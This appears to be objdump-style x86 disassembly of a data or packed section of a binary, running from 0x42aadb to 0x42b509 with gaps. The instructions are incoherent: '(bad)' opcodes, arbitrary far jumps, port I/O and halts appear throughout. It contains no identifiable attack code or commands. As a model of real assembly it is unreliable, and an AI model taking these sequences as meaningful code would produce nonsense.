  42aadb:	and    DWORD PTR [ecx+edx*8],eax
  42aade:	adc    bh,BYTE PTR [eax-0x559c53af]
  42aae4:	(bad)  
  42aae5:	nop
  42aae6:	stc    
  42aae7:	mov    edi,ebp
  42aae9:	mov    BYTE PTR [ebp-0x1b],dl
  42aaec:	fdivrp st(3),st
  42aaee:	jo     0x42ab49
  42aaf0:	cmp    edx,DWORD PTR [edx-0x7e]
  42aaf3:	jmp    0xbca55b75
  42aaf8:	outs   dx,DWORD PTR ds:[esi]
  42aaf9:	add    BYTE PTR [esi],al
  42aafb:	ret    
  42aafc:	aas    
  42aafd:	mov    ebx,0xe453f695
  42ab02:	fsub   DWORD PTR [bx+di-0x7a37]
  42ab07:	and    eax,0x787921d3
  42ab0c:	adc    cl,bh
  42ab0e:	mov    DWORD PTR [esi-0x47],eax
  42ab11:	xchg   esi,eax
  42ab12:	in     eax,0x91
  42ab14:	stos   DWORD PTR es:[edi],eax
  42ab15:	popf   
  42ab16:	jo     0x42aaf1
  42ab18:	les    eax,FWORD PTR [edx+0x3a70cc47]
  42ab1e:	mov    DWORD PTR [eax],edx
  42ab20:	jne    0x42aab5
  42ab22:	push   edx
  42ab23:	or     DWORD PTR [ebx+0x30],edx
  42ab26:	pushf  
  42ab27:	std    
  42ab28:	repz das 
  42ab2a:	jecxz  0x42aaaf
  42ab2c:	call   0xa5860c68
  42ab31:	popf   
  42ab32:	jp     0x42ab5e
  42ab34:	add    BYTE PTR ds:0x8545937c,cl
  42ab3a:	mov    eax,0x70403f78
  42ab3f:	mov    dl,0x5a
  42ab41:	hlt    
  42ab42:	cmp    BYTE PTR [esi],0xd9
  42ab45:	sahf   
  42ab46:	loope  0x42ab95
  42ab48:	or     al,0xa2
  42ab4a:	jle    0x42aadb
  42ab4c:	ins    BYTE PTR es:[edi],dx
  42ab4d:	ss (bad) 
  42ab4f:	jmp    0x44b3:0x401c161a
  42ab56:	fucomip st,st(1)
  42ab58:	push   eax
  42ab59:	xchg   esi,eax
  42ab5a:	imul   DWORD PTR [esi-0x2cda1e85]
  42ab60:	jg     0x42ab87
  42ab62:	jg     0x42ab0b
  42ab64:	jmp    0x169e:0x2952967b
  42ab6b:	mov    edx,0x30a0
	...
  42abd4:	add    BYTE PTR [eax],al
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	in     eax,dx
  42abe3:	outs   dx,DWORD PTR ds:[esi]
  42abe4:	call   0x20d1397
  42abe9:	add    BYTE PTR [eax],al
  42abeb:	add    DWORD PTR [eax],eax
  42abed:	add    BYTE PTR [edi],al
  42abef:	psubw  mm2,mm0
  42abf2:	xchg   ebx,eax
  42abf3:	stos   DWORD PTR es:[edi],eax
  42abf4:	fnstcw WORD PTR [edi+0x57]
  42abf7:	pop    ecx
  42abf8:	cmp    ch,bh
  42abfa:	or     eax,0x69f19a11
  42abff:	mov    ds:0x7c2d2882,al
  42ac04:	jae    0x42aba4
  42ac06:	mov    bl,0xf5
  42ac08:	push   esi
  42ac09:	mov    ebx,0xa01dd4b1
  42ac0e:	bound  esp,QWORD PTR [edi]
  42ac10:	lds    ecx,FWORD PTR [edx-0x52fe076e]
  42ac16:	pop    ds
  42ac17:	mov    ch,BYTE PTR [edi+esi*2+0x35]
  42ac1b:	xchg   edx,eax
  42ac1c:	cs cmp al,0xa0
  42ac1f:	push   0x50
  42ac21:	mov    al,ds:0x69c97eaa
  42ac26:	xchg   esi,eax
  42ac27:	cmp    al,0x0
  42ac29:	jnp    0x42ac97
  42ac2b:	or     eax,0x91a50b58
  42ac30:	outs   dx,BYTE PTR ds:[esi]
  42ac31:	daa    
  42ac32:	pusha  
  42ac33:	repnz sbb ebx,DWORD PTR [eax-0x6b1dc535]
  42ac3a:	lahf   
  42ac3b:	push   es
  42ac3c:	pop    ecx
  42ac3d:	hlt    
  42ac3e:	push   ebx
  42ac3f:	push   eax
  42ac40:	xchg   ecx,eax
  42ac41:	neg    BYTE PTR [ecx]
  42ac43:	mov    esp,0x85826bd7
  42ac48:	dec    esi
  42ac49:	(bad)  
  42ac4b:	mov    dh,0x65
  42ac4d:	out    dx,al
  42ac4e:	mov    ds:0x550008db,al
  42ac53:	aaa    
  42ac54:	enter  0xf80d,0x4a
  42ac58:	std    
  42ac59:	mov    bl,0xcf
  42ac5b:	loopne 0x42ac23
  42ac5d:	pop    ss
  42ac5e:	clc    
  42ac5f:	and    BYTE PTR [edx-0x70],bl
  42ac62:	call   0xc4d3:0xc86109e8
  42ac69:	mov    dh,0xbc
  42ac6b:	add    al,BYTE PTR [edi+0x23dccd11]
  42ac71:	jno    0x42ac5d
  42ac73:	push   edi
  42ac74:	sbb    DWORD PTR [esi-0x2f868d45],0x26b331df
  42ac7e:	cmp    al,0x7c
  42ac80:	scas   eax,DWORD PTR es:[edi]
  42ac81:	jge    0x42accb
  42ac83:	push   esp
  42ac84:	stos   BYTE PTR es:[edi],al
  42ac85:	adc    eax,ecx
  42ac87:	mov    dl,0xba
  42ac89:	fisttp QWORD PTR [edi]
  42ac8b:	(bad)  [ebp+0x47]
  42ac8e:	and    ecx,DWORD PTR [edi+0x61]
  42ac91:	and    ebx,edi
  42ac93:	fwait
  42ac94:	popf   
  42ac95:	mov    bl,0x17
  42ac97:	jle    0x42acad
  42ac99:	adc    BYTE PTR [edi+edi*4-0x755ae41b],bh
  42aca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aca1:	sbb    dl,BYTE PTR [esi-0x1]
  42aca4:	cld    
  42aca5:	scas   al,BYTE PTR es:[edi]
  42aca6:	xchg   edx,eax
  42aca7:	push   DWORD PTR [esi-0x651598be]
  42acad:	pop    edi
  42acae:	fnstcw WORD PTR [esi]
  42acb0:	push   0x8b950419
  42acb5:	imul   edi,DWORD PTR [esi],0xffffffd3
  42acb8:	cmp    ecx,ebx
  42acba:	mov    esi,0x3c0d89b0
  42acbf:	mov    al,ds:0xf16a9dfc
  42acc4:	retf   
  42acc5:	(bad)  
  42acc6:	sub    cl,BYTE PTR [edx-0x1ecf2ce9]
  42accc:	out    dx,eax
  42accd:	add    ch,BYTE PTR [eax+0x0]
  42acd0:	jmp    0x42acca
  42acd2:	mov    edi,ss
  42acd4:	or     al,ah
  42acd6:	inc    edx
  42acd7:	push   esp
  42acd8:	inc    ebx
  42acd9:	rcl    BYTE PTR [ebp+esi*2+0x298fd2ed],cl
  42ace0:	add    DWORD PTR [edx],0xe70d057e
  42ace6:	fadd   st,st(7)
  42ace8:	test   DWORD PTR [edx+0xc10d88f],edx
	...
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	out    dx,al
  42ad63:	push   0xcb6703d4
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	ret    
  42ad6f:	mov    ds:0x823b7e90,eax
  42ad74:	popf   
  42ad75:	xlat   BYTE PTR ds:[ebx]
  42ad76:	pop    ebx
  42ad77:	std    
  42ad78:	push   cs
  42ad79:	mov    eax,ds:0x2c6f8961
  42ad7e:	adc    eax,0x8b5e0a13
  42ad83:	pop    DWORD PTR [ecx+ecx*2-0x16984fc9]
  42ad8a:	mov    esp,0x2a550f4c
  42ad8f:	ins    DWORD PTR es:[edi],dx
  42ad90:	loope  0x42ad2e
  42ad92:	pop    edx
  42ad93:	and    eax,0x387bf3ea
  42ad98:	addr16 mov bh,0x7b
  42ad9b:	jne    0x42ae10
  42ad9d:	xor    BYTE PTR [ecx],dh
  42ad9f:	pop    ebp
  42ada0:	mov    BYTE PTR ds:0x891ebe62,dh
  42ada6:	mov    cs,WORD PTR [ebx-0x45b905b1]
  42adac:	repnz fldenv [edi-0x5c]
  42adb0:	pop    es
  42adb1:	lds    esp,FWORD PTR [edx+0xd]
  42adb4:	mov    al,ds:0x8f1410bb
  42adb9:	in     al,dx
  42adba:	in     al,dx
  42adbb:	mov    edx,0x5abb95e7
  42adc0:	sub    DWORD PTR [ebx-0x14],0xffffffb7
  42adc4:	cmp    dl,BYTE PTR [edi]
  42adc6:	cld    
  42adc7:	push   esi
  42adc8:	or     eax,0x125719db
  42adcd:	fbstp  TBYTE PTR [edi]
  42adcf:	mov    ds:0xfb933382,al
  42add4:	push   cs
  42add5:	xchg   ebp,edx
  42add7:	mov    ebx,0xb6c6bcdf
  42addc:	mov    ds:0x52391efe,al
  42ade1:	jp     0x42adeb
  42ade3:	dec    ebp
  42ade4:	adc    eax,0xb46395c5
  42ade9:	push   0xc6f4c3e6
  42adee:	cmp    ebp,DWORD PTR ds:0x86dfdb38
  42adf4:	enter  0x2e2e,0x89
  42adf8:	adc    eax,0x227fd5fd
  42adfd:	aaa    
  42adfe:	push   edi
  42adff:	push   0xffffffde
  42ae01:	jno    0x42ae27
  42ae03:	xchg   esi,eax
  42ae04:	push   es
  42ae05:	iret   
  42ae06:	fmul   st,st(6)
  42ae08:	mov    al,0x93
  42ae0a:	push   0xffffffdd
  42ae0c:	cmc    
  42ae0d:	fs popa 
  42ae0f:	pop    edi
  42ae10:	xchg   edi,eax
  42ae11:	cmp    DWORD PTR [ecx-0x745b3e17],edx
  42ae17:	(bad)  
  42ae18:	(bad)  
  42ae19:	hlt    
  42ae1a:	rcr    DWORD PTR [ecx+edx*2+0xa],0xca
  42ae1f:	cmp    DWORD PTR [edx-0x394639ee],0x17
  42ae26:	repz jge 0x42ae2a
  42ae29:	ins    BYTE PTR es:[edi],dx
  42ae2a:	fcom   DWORD PTR [eax-0x25ab6358]
  42ae30:	cdq    
  42ae31:	or     DWORD PTR [ecx],edx
  42ae33:	scas   eax,DWORD PTR es:[edi]
  42ae34:	ficomp DWORD PTR [ebp+0x330fa219]
  42ae3a:	pop    esi
  42ae3b:	fstp   QWORD PTR [esi+0x5b3cc9c7]
  42ae41:	clc    
  42ae42:	xchg   ebp,eax
  42ae43:	and    edx,edi
  42ae45:	jg     0x42ae9d
  42ae47:	push   ds
  42ae48:	pop    ebx
  42ae49:	lods   eax,DWORD PTR ds:[esi]
  42ae4a:	les    eax,FWORD PTR [eax]
  42ae4c:	lods   eax,DWORD PTR ds:[esi]
  42ae4d:	jnp    0x42ae80
  42ae4f:	mov    ds:0xd3fcbd09,al
  42ae54:	mov    esp,0x1d403093
  42ae59:	adc    edi,DWORD PTR [edx-0x1eeb1d97]
  42ae5f:	xor    eax,0x156b47e2
  42ae64:	jb     0x42adfb
  42ae66:	sti    
  42ae67:	jg     0x42ae26
  42ae69:	inc    ebx
  42ae6a:	into   
  42ae6b:	scas   eax,DWORD PTR es:[edi]
  42ae6c:	sahf   
  42ae6d:	push   0x0
	...
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	jp     0x42ae95
  42aee4:	pusha  
  42aee5:	aaa    
  42aee6:	addr16 int3 
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	sti    
  42aeef:	pop    edx
  42aef0:	dec    ecx
  42aef1:	push   esi
  42aef2:	xor    eax,0x5093519a
  42aef7:	push   ss
  42aef8:	xchg   ecx,eax
  42aef9:	pop    edx
  42aefa:	cld    
  42aefb:	mov    ds:0x5b2d75c5,al
  42af00:	push   0x51512c6
  42af05:	sub    ebx,DWORD PTR [eax+eax*8]
  42af08:	add    BYTE PTR [ebp-0x8ef8d1],dh
  42af0e:	mov    ecx,0xaed41579
  42af13:	mov    es,WORD PTR [ebx]
  42af15:	(bad)  
  42af17:	cld    
  42af18:	mov    al,0xf6
  42af1a:	add    al,0x81
  42af1c:	fcmovbe st,st(7)
  42af1e:	xchg   esi,eax
  42af1f:	xchg   DWORD PTR [edx-0x40],ecx
  42af22:	stos   BYTE PTR es:[edi],al
  42af23:	cmc    
  42af24:	dec    esi
  42af25:	les    edx,FWORD PTR [edx-0x54]
  42af28:	cmp    al,0xe
  42af2a:	loop   0x42af31
  42af2c:	mov    esp,0x374e4947
  42af31:	ds dec eax
  42af33:	in     eax,0xc2
  42af35:	hlt    
  42af36:	jecxz  0x42af5c
  42af38:	or     al,0xe2
  42af3a:	lea    eax,gs:[edi]
  42af3d:	mov    esi,0x9ccb3cb
  42af42:	js     0x42af69
  42af44:	mov    dh,0xf9
  42af46:	sub    DWORD PTR [esi],ebp
  42af48:	sub    BYTE PTR [edx-0x3bda8b31],ch
  42af4e:	arpl   WORD PTR [edx-0x300a41d7],sp
  42af54:	add    DWORD PTR [esi+0x5d6f73d5],edi
  42af5a:	aam    0x28
  42af5c:	push   esp
  42af5d:	dec    esp
  42af5e:	or     al,0xf
  42af60:	dec    ebx
  42af61:	cmpps  xmm1,xmm2,0x31
  42af65:	sub    DWORD PTR [ebx+eiz*1],edi
  42af68:	add    eax,DWORD PTR ds:0x473be002
  42af6e:	ins    DWORD PTR es:[edi],dx
  42af6f:	lods   eax,DWORD PTR ds:[esi]
  42af70:	retf   0x8aa4
  42af73:	stc    
  42af74:	aaa    
  42af75:	mov    ds:0x60623efb,al
  42af7a:	or     al,0x37
  42af7c:	jmp    0x8086:0xa76cbb6b
  42af83:	mov    eax,ds:0x60ce1e06
  42af88:	mov    dl,BYTE PTR gs:[eax]
  42af8b:	xchg   esp,edx
  42af8d:	fdivr  QWORD PTR [esp+ecx*1+0x68]
  42af91:	dec    BYTE PTR [ebp-0x3a8e540e]
  42af97:	jecxz  0x42af82
  42af99:	and    al,0x61
  42af9b:	jge    0x42af24
  42af9d:	loope  0x42af96
  42af9f:	in     al,0xcc
  42afa1:	test   DWORD PTR [ebp-0x48],ecx
  42afa4:	retf   0x8ca6
  42afa7:	inc    edx
  42afa8:	push   ebp
  42afa9:	enter  0xda54,0xb1
  42afad:	(bad)  
  42afae:	not    BYTE PTR [edi+0xd20757e]
  42afb4:	or     bl,BYTE PTR [edi+0x7d854e84]
  42afba:	(bad)  
  42afbc:	pop    es
  42afbd:	xchg   esp,eax
  42afbe:	mov    eax,ds:0x57156daa
  42afc3:	inc    ecx
  42afc4:	iret   
  42afc5:	cmp    al,0xa2
  42afc7:	shl    bl,cl
  42afc9:	lea    ebx,[ebp-0x21a98897]
  42afcf:	sti    
  42afd0:	jmp    0x3e4d:0xeed8743b
  42afd7:	int3   
  42afd8:	jle    0x42afea
  42afda:	xor    BYTE PTR [eax],0x65
  42afdd:	sub    ecx,eax
  42afdf:	mov    ds:0xf6dd9b8,eax
  42afe4:	shl    eax,cl
  42afe6:	xlat   BYTE PTR ds:[ebx]
  42afe7:	sbb    DWORD PTR [edi],edx
  42afe9:	jno    0x42af6c
  42afeb:	mov    esp,0x135a
	...
  42b054:	add    BYTE PTR [eax],al
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	in     al,dx
  42b063:	rol    bh,0x24
  42b066:	addr16 int 0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [esi+0x778ac991],dl
  42b073:	sbb    eax,edi
  42b075:	into   
  42b076:	daa    
  42b077:	mul    BYTE PTR [edx+0x53]
  42b07a:	rcr    ah,0xaf
  42b07d:	test   eax,0x974b64da
  42b082:	gs (bad) 
  42b084:	ds inc esi
  42b086:	aad    0xe3
  42b088:	mov    bh,0x5f
  42b08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b08b:	aad    0x68
  42b08d:	dec    edi
  42b08e:	fsub   DWORD PTR [ebp+edx*2+0x21]
  42b092:	mov    bh,0xe6
  42b094:	sbb    edx,DWORD PTR [esi-0x3b18f3dc]
  42b09a:	inc    edx
  42b09b:	(bad)  
  42b09c:	jmp    0xb111:0xeb3820a3
  42b0a3:	pop    ds
  42b0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0a5:	sub    ebx,esp
  42b0a7:	lahf   
  42b0a8:	inc    edi
  42b0a9:	inc    ebp
  42b0aa:	scas   eax,DWORD PTR es:[edi]
  42b0ab:	shr    DWORD PTR ds:0x38991bfb,1
  42b0b1:	out    dx,al
  42b0b2:	add    dh,dh
  42b0b4:	push   eax
  42b0b5:	les    esp,FWORD PTR [ecx-0x7f]
  42b0b8:	xor    edi,DWORD PTR [edi+0x10]
  42b0bb:	push   eax
  42b0bc:	pop    ss
  42b0bd:	das    
  42b0be:	mov    BYTE PTR [ecx+0x29],dh
  42b0c1:	dec    edx
  42b0c2:	mov    ds:0x66d7dd57,eax
  42b0c7:	dec    edx
  42b0c8:	dec    esi
  42b0c9:	push   0xffffffc7
  42b0cb:	fimul  DWORD PTR [eax+0x63697a4e]
  42b0d1:	jb     0x42b13d
  42b0d3:	mov    al,ds:0x3e350061
  42b0d8:	ds mov dh,0xda
  42b0db:	das    
  42b0dc:	retf   0x5066
  42b0df:	in     eax,dx
  42b0e0:	or     DWORD PTR [ebp-0x4c],esi
  42b0e3:	mov    bh,0x43
  42b0e5:	(bad)  
  42b0e6:	mov    eax,ds:0x55428fd3
  42b0eb:	jmp    0xb493f0df
  42b0f0:	mov    ah,0x22
  42b0f2:	push   0x59
  42b0f4:	push   ds
  42b0f5:	in     al,dx
  42b0f6:	sub    DWORD PTR [esi+0x37],ebp
  42b0f9:	adc    DWORD PTR [esi+0x5a],0x7b0e8f45
  42b100:	mov    WORD PTR [edi+0x2d7cf895],?
  42b106:	out    dx,eax
  42b107:	out    dx,al
  42b108:	leave  
  42b109:	out    dx,eax
  42b10a:	jmp    0x5623:0x5cd38173
  42b111:	(bad)
  42b115:	aam    0xbc
  42b117:	jl     0x42b0a5
  42b119:	aaa    
  42b11a:	jl     0x42b14f
  42b11c:	cmp    ecx,edx
  42b11e:	push   ecx
  42b11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b120:	out    0xdc,eax
  42b122:	mov    edx,0x3076232a
  42b127:	mov    dl,0x65
  42b129:	fst    DWORD PTR [edi]
  42b12b:	fbld   TBYTE PTR [edi-0x31]
  42b12e:	sub    DWORD PTR [edx+0x196a7f5c],eax
  42b134:	stos   BYTE PTR es:[edi],al
  42b135:	out    dx,al
  42b136:	pop    ebx
  42b137:	xchg   edi,eax
  42b138:	call   0x2f6c1612
  42b13d:	push   ds
  42b13e:	es iret 
  42b140:	lahf   
  42b141:	mov    ch,0x5
  42b143:	adc    al,0xae
  42b145:	(bad)  
  42b147:	fist   DWORD PTR [edi]
  42b149:	jg     0x42b0ce
  42b14b:	out    dx,eax
  42b14c:	xor    esp,DWORD PTR [esi+0x2d]
  42b14f:	push   0xffffffba
  42b151:	data16 out 0x92,al
  42b154:	dec    ecx
  42b155:	xor    eax,0x27735852
  42b15a:	ss inc edi
  42b15c:	mov    cl,0xdc
  42b15e:	sbb    BYTE PTR [ebx-0x1b],0x8c
  42b162:	hlt    
  42b163:	jno    0x42b147
  42b165:	or     bl,BYTE PTR [edx+0x5a078c1c]
  42b16b:	xor    eax,DWORD PTR [ecx]
  42b16d:	and    eax,DWORD PTR [eax]
	...
  42b1d3:	add    BYTE PTR [eax],al
  42b1d5:	add    BYTE PTR [ebp+0x25],dh
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	cmp    esi,DWORD PTR [eax-0x38]
  42b1e5:	retf   0xce67
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	mov    ebx,0x82591f35
  42b1f3:	imul   edi,DWORD PTR ds:0xf2825748,0xbc38ab1f
  42b1fe:	arpl   cx,cx
  42b200:	xchg   ecx,eax
  42b201:	pop    es
  42b202:	in     al,0xc7
  42b204:	fwait
  42b205:	js     0x42b25a
  42b207:	or     al,0x27
  42b209:	fimul  WORD PTR [edx]
  42b20b:	(bad)  
  42b20c:	push   ss
  42b20d:	sub    al,BYTE PTR [eax+0x3b]
  42b210:	cmp    BYTE PTR [ecx+edi*8+0x221ae08d],ch
  42b217:	and    eax,eax
  42b219:	dec    esp
  42b21a:	ret    
  42b21b:	pop    ds
  42b21c:	fwait
  42b21d:	cmp    al,BYTE PTR [ebp-0x34]
  42b220:	mov    ch,0xb3
  42b222:	daa    
  42b223:	xor    al,0x73
  42b225:	xchg   dl,bl
  42b227:	jmp    0xbcd2c040
  42b22c:	sbb    DWORD PTR [ecx+0x23067b16],ebx
  42b232:	ins    BYTE PTR es:[edi],dx
  42b233:	mov    ecx,0x672f27e
  42b238:	outs   dx,DWORD PTR ds:[esi]
  42b239:	(bad)  
  42b23a:	mov    ecx,0xa60a0209
  42b23f:	jg     0x42b2a7
  42b241:	dec    DWORD PTR [edx+eiz*8-0x74]
  42b245:	mov    BYTE PTR [esi],bh
  42b247:	xor    edx,DWORD PTR es:[ebx]
  42b24a:	xor    DWORD PTR [edx],0x3456d887
  42b250:	into   
  42b251:	lock add edx,eax
  42b254:	xchg   DWORD PTR [esi+0x6b],esp
  42b257:	fadd   QWORD PTR ds:0xdb06f5fb
  42b25d:	add    DWORD PTR [ebx-0xf],edi
  42b260:	cmp    al,0x87
  42b262:	push   esp
  42b263:	fisub  DWORD PTR [edi]
  42b265:	in     al,dx
  42b266:	mov    ecx,0x638f9260
  42b26b:	cs (bad) 
  42b26d:	xor    eax,0xae8de6a
  42b272:	adc    BYTE PTR [edx+0x15d45bac],ch
  42b278:	cmp    eax,0xb6c6075a
  42b27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b27e:	cwde   
  42b27f:	nop
  42b280:	dec    ebx
  42b281:	mov    fs,ebx
  42b283:	jno    0x42b283
  42b285:	stos   BYTE PTR es:[edi],al
  42b286:	das    
  42b287:	adc    BYTE PTR [edx-0x6],bl
  42b28a:	stc    
  42b28b:	cli    
  42b28c:	xor    BYTE PTR ds:0xc41a7b1a,0xa2
  42b293:	lahf   
  42b294:	ret    
  42b295:	jl     0x42b294
  42b297:	mov    bh,0xb3
  42b299:	mov    ds:0xa3b47771,eax
  42b29e:	retf   
  42b29f:	dec    esi
  42b2a0:	mov    gs,WORD PTR [edi]
  42b2a2:	cmp    bl,dh
  42b2a4:	mov    al,ds:0x40b8ab03
  42b2a9:	mov    ecx,0x136e4b29
  42b2ae:	stos   BYTE PTR es:[edi],al
  42b2af:	and    DWORD PTR [edi],ebp
  42b2b1:	or     DWORD PTR [ebx],ebp
  42b2b3:	push   edi
  42b2b4:	test   BYTE PTR [edx+ebx*1],ah
  42b2b7:	pushf  
  42b2b8:	pushf  
  42b2b9:	mov    ds:0x27c74993,al
  42b2be:	xor    cl,BYTE PTR [eax+0x73]
  42b2c1:	mov    al,0xd7
  42b2c3:	adc    edi,DWORD PTR [edi+0x1f]
  42b2c6:	xor    DWORD PTR [ebp-0x36],edi
  42b2c9:	out    dx,eax
  42b2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2cb:	cmp    bl,dl
  42b2cd:	push   ebx
  42b2ce:	mov    ch,0x34
  42b2d0:	loopne 0x42b28b
  42b2d2:	push   0x68
  42b2d4:	in     eax,0xdc
  42b2d6:	or     ebp,DWORD PTR [eax+0xfdd90fa]
  42b2dc:	cwde   
  42b2dd:	call   0x32b9:0x2efbb773
  42b2e4:	test   BYTE PTR [ecx],bl
  42b2e6:	add    DWORD PTR [edx],edx
  42b2e8:	shr    BYTE PTR [esi+0x4d93d48f],0x0
	...
  42b353:	add    BYTE PTR [eax],al
  42b355:	add    BYTE PTR [ebp-0x449f6672],ah
  42b35b:	ja     0x42b35a
  42b35d:	iret   
  42b35e:	sub    eax,0x2e738e65
  42b363:	loopne 0x42b37f
  42b365:	jg     0x42b3ce
  42b367:	iret   
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	rcl    BYTE PTR [edx-0x53],1
  42b371:	cdq    
  42b372:	xchg   BYTE PTR [esi+0x5a],ah
  42b375:	scas   al,BYTE PTR es:[edi]
  42b376:	jae    0x42b38d
  42b378:	push   edi
  42b379:	cs dec ecx
  42b37b:	add    eax,0x1a37f3d8
  42b380:	ins    BYTE PTR es:[edi],dx
  42b381:	enter  0xcc77,0x46
  42b385:	push   edx
  42b386:	retf   0x26bd
  42b389:	mov    dh,0x61
  42b38b:	mov    cl,0x1c
  42b38d:	xchg   edi,edi
  42b38f:	xor    eax,0x703ec8d0
  42b394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b395:	sbb    al,0xef
  42b397:	xor    BYTE PTR [edi+0x3f],al
  42b39a:	popf   
  42b39b:	ss push cs
  42b39d:	repz in eax,dx
  42b39f:	out    dx,al
  42b3a0:	cmc    
  42b3a1:	xchg   ebx,eax
  42b3a2:	pop    ecx
  42b3a3:	mov    dh,0x72
  42b3a5:	les    edx,FWORD PTR [edi-0x74]
  42b3a8:	bound  ebx,QWORD PTR [ebx+0x5a]
  42b3ab:	push   ds
  42b3ac:	mov    esi,0xdc267d2e
  42b3b1:	dec    esp
  42b3b2:	in     al,dx
  42b3b3:	ficom  DWORD PTR [edx+0x8c2b5bb]
  42b3b9:	sbb    DWORD PTR [ecx],esp
  42b3bb:	fcom   DWORD PTR fs:[eax+0x12b4e15d]
  42b3c2:	mov    eax,0x5754ca40
  42b3c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3c8:	ror    cl,cl
  42b3ca:	and    cl,cl
  42b3cc:	xor    ebp,DWORD PTR [eax-0x4c]
  42b3cf:	shl    DWORD PTR [ecx+edi*1-0x5e9a0f26],cl
  42b3d6:	mov    ch,0xc3
  42b3d8:	nop    DWORD PTR [edi+0x29]
  42b3dc:	pop    edi
  42b3dd:	or     DWORD PTR [eax+0x48],ebp
  42b3e0:	(bad)  
  42b3e1:	fst    QWORD PTR [ebx-0x7bee7059]
  42b3e7:	sar    edi,1
  42b3e9:	add    bh,BYTE PTR [ebx-0xc]
  42b3ec:	ins    DWORD PTR es:[edi],dx
  42b3ed:	mov    ebp,0x64407ddb
  42b3f2:	xchg   esp,eax
  42b3f3:	mov    bl,0x9
  42b3f5:	cmp    DWORD PTR [eax-0x60],edi
  42b3f8:	and    eax,0x983a8038
  42b3fd:	stos   DWORD PTR es:[edi],eax
  42b3fe:	dec    eax
  42b3ff:	xchg   esp,eax
  42b400:	mov    ah,0xcd
  42b402:	shl    BYTE PTR [edi+ebx*1+0x9],1
  42b406:	push   edi
  42b407:	or     ebx,esp
  42b409:	add    esp,DWORD PTR [edx+0x6667d4c7]
  42b40f:	mul    bl
  42b411:	jnp    0x42b3db
  42b413:	clc    
  42b414:	jge    0x42b47f
  42b416:	adc    ecx,edx
  42b418:	outs   dx,DWORD PTR ds:[esi]
  42b419:	jae    0x42b497
  42b41b:	mov    dh,0x63
  42b41d:	outs   dx,BYTE PTR ds:[esi]
  42b41e:	sbb    BYTE PTR [ebp-0x1c2ce66c],bh
  42b424:	(bad)  
  42b425:	scas   al,BYTE PTR es:[edi]
  42b426:	xor    dl,BYTE PTR [ecx-0x70]
  42b429:	ins    DWORD PTR es:[edi],dx
  42b42a:	fdiv   DWORD PTR [ebx+0x2b]
  42b42d:	pop    ds
  42b42e:	push   es
  42b42f:	adc    al,0xb1
  42b431:	dec    edx
  42b432:	test   eax,0x5c07929e
  42b437:	(bad)  
  42b438:	inc    edi
  42b439:	jg     0x42b3c9
  42b43b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b43c:	sub    dh,BYTE PTR [esi-0x2c672083]
  42b442:	imul   edi,DWORD PTR ss:[ebx+0x60],0x3b
  42b447:	pop    esi
  42b448:	dec    ebp
  42b449:	cld    
  42b44a:	push   esi
  42b44b:	neg    DWORD PTR [ebx+0x46bd21d1]
  42b451:	pusha  
  42b452:	inc    esp
  42b453:	pop    ebp
  42b454:	mov    dh,0xf0
  42b456:	sbb    ecx,eax
  42b458:	adc    eax,0x8573784b
  42b45d:	loop   0x42b3fc
  42b45f:	retf   
  42b460:	bound  esp,QWORD PTR [ecx-0x5b6c006e]
  42b466:	sub    edi,DWORD PTR [edi+edx*8]
  42b469:	sbb    DWORD PTR [ebp-0x5f],edx
  42b46c:	repnz inc eax
	...
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [ebx-0x6d],esp
  42b4e4:	icebp  
  42b4e5:	outs   dx,BYTE PTR ds:[esi]
  42b4e6:	rol    BYTE PTR [bx+di],1
  42b4e9:	add    BYTE PTR [eax],al
  42b4eb:	add    DWORD PTR [eax],eax
  42b4ed:	add    BYTE PTR ds:0x50b6c28f,cl
  42b4f3:	(bad)  
  42b4f4:	xchg   edi,eax
  42b4f5:	std    
  42b4f6:	dec    esi
  42b4f7:	ss cwde 
  42b4f9:	mov    esi,gs
  42b4fb:	sbb    eax,0x24b6c5b5
  42b500:	shl    BYTE PTR [edi-0x38],cl
  42b503:	ret    0xa04d
  42b506:	add    DWORD PTR [ecx+0x2a],ebp
  42b509:	fnstcw WORD PTR [edx]
